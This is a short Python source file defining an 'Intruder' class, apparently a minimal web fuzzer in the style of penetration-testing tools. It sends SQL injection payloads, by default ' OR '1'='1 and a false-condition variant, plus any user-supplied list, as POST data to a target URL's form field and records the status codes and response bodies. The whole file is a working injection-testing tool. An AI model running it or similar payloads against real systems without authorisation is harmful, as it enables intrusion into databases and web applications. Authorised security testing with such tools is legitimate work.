import requests

class Intruder:
    def __init__(self):
        self.payloads = ["' OR '1'='1", "' OR '1'='2"]  # Example payloads
        self.custom_payloads = []

    def set_custom_payloads(self, payloads):
        self.custom_payloads = payloads.splitlines()  # Split input into lines

    def attack(self, target_url):
        results = []
        # Use custom payloads if available, else use default
        payloads_to_use = self.custom_payloads or self.payloads
        for payload in payloads_to_use:
            response = requests.post(target_url, data={"input_field": payload})
            results.append((payload, response.status_code, response.text))  # Include response text
        return results
